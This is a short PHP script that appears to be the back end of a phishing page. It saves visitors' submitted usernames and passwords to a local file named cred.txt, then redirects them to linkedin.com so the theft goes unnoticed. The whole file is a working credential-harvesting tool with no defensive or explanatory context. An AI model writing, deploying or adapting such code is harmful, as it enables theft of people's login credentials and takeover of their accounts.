<?php

file_put_contents("cred.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com');
exit();
